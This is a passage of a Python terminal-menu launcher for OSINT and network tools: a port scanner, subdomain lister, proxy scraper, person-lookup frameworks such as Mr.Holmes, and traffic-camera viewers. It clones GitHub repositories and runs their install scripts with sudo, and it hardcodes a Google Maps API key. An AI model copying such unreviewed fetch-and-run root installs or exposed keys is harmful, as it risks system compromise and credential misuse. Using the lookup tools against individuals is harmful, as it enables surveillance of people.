        ) in " \033[95mSecurity auditing tool for Linux, macOS, and UNIX-based systems. Assists with compliance testing (HIPAA/ISO27001/PCI DSS) and system hardening.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "IP-Lookup":
        print(" ")
        print("\033[96mIP-Lookup")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[95mProvides a simple web interface where you can enter an IP address and retrieve its corresponding location information.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "PortScan":
        print(" ")
        print("\033[96mPortScan")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[95mSlightly Modified Quick Open Port Scanner for URL's":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "Simba":
        print(" ")
        print("\033[96mSimba")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[95mWeb Header Security Scanner for URL's":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "ProxyScrape":
        print(" ")
        print("\033[96mProxyScrape")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[95mScrapes for free proxies. Tests list and returns all validated proxies from list.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "WiFi":
        print(" ")
        print("\033[96mOptimize WiFi")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mManipulate WiFi Interface to ensure the Fastest speed for That network":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "Subdomains":
        print(" ")
        print("\033[96mSubdomains")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[95mLists Known Subdomains for Any domain user inputs":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    elif choice == "Sys Info":
        print(" ")
        print("\033[96mSystem Information")
        print(" ")
        print("", end="", flush=True)
        for char in " \033[95mShows essid, Channel, and Interface":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        networks_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        networks_menu()


def frameworks_menu():
    clear_screen()
    ascii_banner()
    print(colored("Frameworks-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print(
        "                  \033[91m1\033[0m)\033[90m Maryam                             \033[91m2\033[0m)\033[90m Mr.Holmes                             \033[91m3\033[0m)\033[90m Odinova Tiger"
    )
    footer()
    choice = input("\033[0mSelect an option: ")

    if choice == "1":
        change()
        install_command = "pipenv install git+https://github.com/saeeddhqan/maryam.git"
        os.system(install_command)
        run_command = "maryam -s"
        os.system(run_command)
        show_command = "show modules"
        what_now()
    elif choice == "2":
        change()
        os.system("git clone https://github.com/Lucksi/Mr.Holmes")
        os.system("sudo apt-get update")
        os.chdir("Mr.Holmes")
        os.system("git fetch")
        os.system("git pull")
        os.system("sudo chmod +x install.sh")
        os.system("sudo bash ./install.sh")
        os.system("pipenv install -r requirements.txt")
        os.system("sudo python3 MrHolmes.py")
        what_now()
    elif choice == "3":
        change()
        clear_screen()
        ascii_banner
        print(colored("CLONING REPO...", "red", attrs=["reverse", "blink", "bold"]))
        header()
        subprocess.run(["git", "clone", "https://github.com/AnonCatalyst/Odinova.git"])
        os.chdir("Odinova")
        os.system("git fetch")
        os.system("git pull")
        clear_screen()
        ascii_banner()
        print(
            colored(
                "INSTALLING DEPENDENCIES...", "red", attrs=["reverse", "blink", "bold"]
            )
        )
        header()
        os.system("pipenv run python3 -m pipenv install -r requirements.txt")
        os.system("sudo chmod +x install_tools.sh")
        os.system("sudo bash ./install_tools.sh")
        os.system("pipenv run python3 -m pip install getrails")
        os.system("pipenv run python3 -m pip install pydork")
        os.system("pipenv run python3 odinova.py")
        what_now()
    elif choice == "Maryam":
        print(" ")
        print("\033[96mMaryam")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mExtensive Osint Framework. Just type 'show modules' after cloning in to see options":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        frameworks_menu()
    elif choice == "Mr.Holmes":
        print(" ")
        print("\033[96mMr.Holmes")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mWell Rounded Osint Tool utilizing a Web interface. Emails, Usernames, Phone numbers, Names, ect.":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        frameworks_menu()
    elif choice == "Odinova Tiger":
        print(" ")
        print("\033[96mTiger Beta")
        print(" ")
        print("", end="", flush=True)
        for (
            char
        ) in " \033[92mRevamp of previous Odinova Gui. Many additional features being implemented. Fine Work by AnonCatalyst":
            print(char, end="", flush=True)
            time.sleep(0.04)
        time.sleep(3)
        frameworks_menu()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        frameworks_menu()


def cameras_menu():
    clear_screen()
    ascii_banner()
    print(colored("Traffic-Cam Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print("\033[91m1\033[0m)\033[90m \033[91mU\033[97mS\033[94mA\033[0m")
    print("\033[91m2\033[0m)\033[90m UK")
    footer()
    choice = input("Select an option: ")

    if choice == "1":
        usa_menu()
    elif choice == "2":
        uk_menu()
    elif choice == "BACK":
        main_menu()
    elif choice == "HELL":
        main_menu
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        cameras_menu()


def cam_menu():
    clear_screen()
    ascii_banner()
    print("Enter TOWN NAME (ex. Norfolk)")
    TN = input("> ")
    print("Enter STATE ABBREVIATION (ex. VA)")
    SA = input("> ")
    print("Enter STREET NAME (ex. Lucas)")
    SN = input("> ")
    print("Enter STREET SUFFIX (ex. Road)")
    SB = input("> ")
    print("Enter STREET NUMBER (ex. 430)")
    SNB = input("> ")

    address = f"{SNB} {SN} {SB}, {TN}, {SA}"
    api_key = "AIzaSyDsvdPFQSi5Oc14mSCNivuc-afU5Gg-83o"
    url = f"https://maps.googleapis.com/maps/api/geocode/json?address={address}&key={api_key}"
    response = requests.get(url).json()

    if response["status"] == "OK":
        results = response["results"]
        if len(results) != 1:
            print(
                "THIS LOCATION IS NOT A GOOD POINT OF REFERENCE, PLEASE SELECT ANOTHER"
            )
        else:
            location = results[0]["geometry"]["location"]
            LAT = location["lat"]
            LONG = location["lng"]
            new_url = f"https://trafficview.org/live_traffic/#9/{LAT}/{LONG}"
            webbrowser.open_new_tab(new_url)
            cameras_menu()
    else:
        error_message = response.get("error_message", "Unknown Error")
        print("Error occurred:", error_message)
        cameras_menu()


def usa_menu():
    clear_screen()
    ascii_banner()
    print(colored("USA Sub-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print("1) \033[95mCalifornia\033[0m")
    print("2) \033[95mDelaware\033[0m")
    print("3) \033[95mMississippi\033[0m")
    print("4) \033[95mNebraska\033[0m")
    print("5) \033[95mNevada\033[0m")
    print("6) \033[95mTennessee\033[0m")
    print("7) \033[95mTexas\033[0m ZOOM OUT")
    print(
        "8) Search Nearest by Address \033[95mAZ\033[0m, \033[95mCA\033[0m, \033[95mDEL\033[0m, \033[95mFL\033[0m, \033[95mGA\033[0m, \033[95mMD\033[0m, \033[95mVA\033[0m, \033[95mVT\033[0m"
    )
    print("\033[41m9)\033[40m Run\033[0m")
    choice = input("Select an option: ")

    if choice == "1":
        webbrowser.open("https://cwwp2.dot.ca.gov/vm/nomap.htm")
    elif choice == "2":
        webbrowser.open("https://deldot.gov/map/index.shtml")
    elif choice == "3":
        webbrowser.open("https://www.mdottraffic.com/default.aspx?fullsite=1")
    elif choice == "4":
        webbrowser.open(
            "https://lincolnne.maps.arcgis.com/apps/MapTour/index.html?appid=80596d640a63496e84f02bf26ca105bb"
        )
    elif choice == "5":
        webbrowser.open("https://www.nvroads.com/")
    elif choice == "6":
        webbrowser.open(
            "https://www.knoxvilletn.gov/residents/streets_traffic_transit/tdot_smart_way_traffic_cameras"
        )
    elif choice == "7":
        webbrowser.open("https://its.txdot.gov/its/District/AMA")
    elif choice == "8":
        cam_menu()
    elif choice == "9":
        clear_screen()
        ascii_banner()
        what_now()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        usa_menu()


def uk_menu():
    clear_screen()
    ascii_banner()
    print(colored("UK Sub-Menu", "red", attrs=["reverse", "blink", "bold"]))
    time.sleep(0.01)
    header()
    print("\033[91m1\033[0m)\033[90m London")
    print("\033[93m2)\033[40m Run\033[0m")
    choice = input("Select an option: ")

    if choice == "1":
        webbrowser.open("https://www.tfljamcams.net/")
    elif choice == "2":
        clear_screen()
        ascii_banner()
        what_now()
    else:
        print("\033[91m INVALID SELECTION\033[0m")
        time.sleep(1)
        clear_screen()
        ascii_banner()
        uk_menu()


if __name__ == "__main__":
    main_menu()
